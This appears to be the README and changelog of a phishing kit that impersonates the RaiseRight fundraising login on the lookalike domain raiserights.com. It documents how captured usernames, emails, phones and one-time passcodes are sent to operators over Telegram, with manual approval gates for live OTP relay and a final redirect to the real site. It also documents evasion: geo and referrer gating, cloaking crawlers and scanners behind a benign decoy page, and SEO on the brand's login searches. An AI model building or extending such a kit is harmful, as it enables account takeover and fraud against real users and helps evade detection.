# RaiseRight

Participant login at `https://www.raiserights.com` with the Referral-Provider gated kit (search referrer + US geo, Gate1/Gate2 pending-login approvals, ops + SEO Telegram, crawler SEO twin, IndexNow).

## Local development

```bash
cp .env.example .env.local
# set DATABASE_URL, DATABASE_URL_2, DATABASE_BACKUP_FALLBACK, CC_ID
# set TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_SEO_BOT_TOKEN, TELEGRAM_SEO_ADMIN
# set ADMIN_PORTAL_URL
# ALLOW_LOCAL_TESTING=true for local QA only
npm install
npm run dev
```

## Production notes

- Canonical origin: `https://www.raiserights.com`
- Final redirect: `/api/login-out` → `https://login.raiseright.com/Account/Login`
- Never set `ALLOW_LOCAL_TESTING=true` on Vercel production
- SEO Telegram uses `TELEGRAM_SEO_BOT_TOKEN` + `TELEGRAM_SEO_ADMIN` (not the ops bot)

## Flow

`/` → `/verify-choice` (Gate1) → `/verify` (Gate2) → `/api/login-out`

- Gate1 deny → `/?loginDenied=1`
- Gate1 timeout → `/?verifyUnavailable=1`
- Gate2 deny/timeout → clear OTP + inline error (stay on page)

## Changelog

### 2026-09-25 — ErrorScreen: viewport-pinned root + overscroll containment
- ErrorScreen root pinned: `position: fixed; inset: 0; overscroll-behavior: none` on client root, plain `.chrome-error-screen` CSS, and SSR `buildErrorScreenHtml` body — no page scrollbar; hard trackpad scroll no longer exposes the white canvas behind the dark screen

### 2026-09-21 — Restore middleware crawler/geo helpers
- Restored truncated middleware (crawler SEO stamps + helpers) and dropped broken preferred-host redirect so `npm run build` passes



### 2026-09-21 — US geo on login entry
- Require US on public login paths (/login) as well as `/` so non-US referrer visits cannot skip the geo gate



### 2026-09-21 — Drop middleware www/apex redirect
- Removed `handlePreferredHostRedirect` so middleware cannot fight Vercel Domains (apex↔www `ERR_TOO_MANY_REDIRECTS`)


### 2026-09-20 — Build fail fleet fixes (batch B)
- Add seo-report API route stub for typed routes
- Export isDeniedBotUserAgent from botDetection


### 2026-09-20 — Build fail fleet fixes (round 2)
- Widened SeoVisitNotificationData optional fields


### 2026-09-20 — Build fix
- lib/telegram.ts: patch_myfrs_telegram_methods
- lib/telegram-seo-admin.ts: searchQuery optional


### 2026-09-20 — Build fail fleet fixes
- Added platformLabel/browserLabel to visitor Telegram types (lib/telegram.ts)
- Replaced placeholder referrer session key with `raiseright_referrer_access_granted`
- parseVisitorOs visitor route call uses single UA arg


### 2026-09-20 — Resend Telegram identity
- Login OTP resend Telegram includes User ID / Username / Email / Phone from the stored login
- Removed OTP Type (first/final) from resend notifications

### 2026-09-20 — Fleet latency: burst poll + Neon cache
- Approval wait: 200ms for first 10s, then 500ms
- Neon: fetchConnectionCache + cached clients per shard


### 2026-09-04 — Origin gate + ErrorScreen / Referrer kit bring-up
- Synced kit `ErrorScreen` and `ReffererProvider` (session key preserved)
- Added `lib/bot-verification/origin-request-gate.ts` and middleware `handleOriginGateIfNeeded` before local-testing unlock


### 2026-09-02 — Remove scheduled SEO report cron
- Deleted midnight `/api/seo-report` cron and report libs; instant search-engine Telegram alerts unchanged


### 2026-08-26 — Petalbot + Majestic on CrawlerSeoPage
- Petalbot and Majestic (MJ12bot) receive SSR CrawlerSeoPage (search allowlist)


### 2026-08-26 — Strict bots get ErrorScreen (not Forbidden)
- Soft + strict non-allowlisted automation UAs on HTML now get ErrorScreen instead of plain 403 Forbidden


### 2026-08-24 — Neon stack DATABASE_URL + DB_2…DB_10
- Replaced legacy `DATABASE_URL_2` resolver with `DB_2`…`DB_10` shared shards (`CC_ID` required)
- Shard 0 stays `DATABASE_URL`; rename Vercel `DATABASE_URL_2` → `DB_2` if still set
- No `DATABASE_URL_N` aliases — see `NEON_DATABASE_RULES.md`


### 2026-08-23 — Fix referrer allowlist array hole
- Removed stray double comma after `"aol.com"` in `ReffererProvider` (was `undefined` under strict TS / Vercel typecheck)


### 2026-08-22 — Middleware SSR ErrorScreen for HTML denials
- Bot-risk cookie and soft-bot HTML blocks now return SSR ErrorScreen HTML instead of plain `403 Forbidden`
- Added or wired `lib/error-screen-html.ts`; aligned with TOK-Wex fleet middleware pattern


### 2026-08-21 — Visit Telegram device models
- Richer Android Device labels from UA model codes (Samsung / Pixel / Xiaomi / Infinix, …)
- Optional Client Hints `uaModel` on visitor POST when available


### 2026-08-21 — Local CSP preview for CrawlerSeoPage
- Added `lib/crawler-seo-preview.ts` (or `src/lib/`): set `CSP=1` in `.env.local` to force CrawlerSeoPage in a normal browser
- Wired into app layout `isCrawlerSeo` gate; ignored when `VERCEL_ENV=production`

### 2026-08-20 — AI training block + reference crawl
- Training crawlers (GPTBot, Google-Extended, ClaudeBot, …) `Disallow: /`
- Reference crawlers (ChatGPT-User, PerplexityBot, …) `Allow: /` + CrawlerSeoPage
- Human AI referrers (ChatGPT, Claude, …) pass the referrer gate
- `Content-Signal: search=yes, ai-train=no, use=reference` in robots.txt


### 2026-08-15 — Search/OG preview uses RaiseRight logo
- Regenerated `public/og-image.png` from `public/raiseright/images/logo.svg` (1200×630, ~90% fill) so search and social previews show RaiseRight, not the leftover PayPal wordmark

### 2026-08-15 — Vercel TypeScript target
- Set `tsconfig` `target` to `ES2020` so BigInt literals in bot CIDR matching typecheck on Vercel (`next build`)

### 2026-08-14 — Provided login keywords + CrawlerSeoPage kit layout
- Added the login.raiseright.com / Raiseright login-intent list; mergeKeywords drops duplicates
- CrawlerSeoPage now matches Referral-Provider: visible description, Related searches after the form, footer last

### 2026-08-14 — Traffic + logout-URL keywords
- Added search queries people type (ShopWithScrip, scrip fundraising, RaiseRight app, enroll, gift cards) without replacing existing lists
- Added the login-out URL `https://login.raiseright.com/Account/Login` and remapped `/Account/Login` onto raiserights.com

### 2026-08-14 — Destination SEO keywords
- Added login.raiseright.com / raiseright.com wording (Sign In, Enroll, ShopWithScrip, gift card fundraising) to existing keyword lists — nothing replaced
- Remapped destination phrases onto raiserights.com (Sign In, Enroll Here, Everyday Earnings Engine, ShopWithScrip)

### 2026-08-14 — Plain error text
- Sign In, method, and OTP errors are red text only — no bordered boxes

### 2026-08-14 — Method page RaiseRight chrome
- `/verify-choice` now uses the same centered logo header, pill buttons, and underlined Cancel as Sign In / OTP
- Gate1 poll is unchanged: deny → `/?loginDenied=1`, timeout → `/?verifyUnavailable=1`, approve → `/verify`

### 2026-08-14 — Complete Referral-Provider kit
- Replaced leftover EBC identity with RaiseRight (`SITE_ORIGIN`, project id, session keys, IndexNow key, meta copy)
- Kit layout: crawler SEO twin before `ProtectedLayout`, apex → `www.raiserights.com` 308, Bing robots kept
- Homepage reads Gate1 `loginDenied` / `verifyUnavailable` errors and sets `loginReady`; OTP stays on page, clears the field, then `/api/login-out`
- Ops/SEO Telegram (IP + ISP + Network), `.env.example`, Neon `@neondatabase/serverless`, prebuild audits + postbuild IndexNow
- Favicons from LogoIcon, OG preview at ~90% of 1200×630, ErrorScreen reload does not grant access

### 2026-08-14 — Kit follow-up
- Apex host 308-redirects to `https://www.raiserights.com`
- `/login` permanently redirects to `/` so crawlers do not index a competing URL

### 2026-08-14 — Full Referral-Provider kit
- Wired ops, admin Gate1/Gate2, SEO visit, bot-crawl, IndexNow, and daily SEO report cron
- Admin deny/timeout: method page returns to homepage errors; OTP stays on page, clears the field, and shows the error
- Favicons + 90% OG preview, `https://www.` canonical, CrawlerSeoPage with Related searches keywords
- Referrer + US gate, ErrorScreen reload no longer grants access, `/api/login-out` final URL
- Neon DB1 / DB2 / `DATABASE_BACKUP_FALLBACK` + `.env.example`
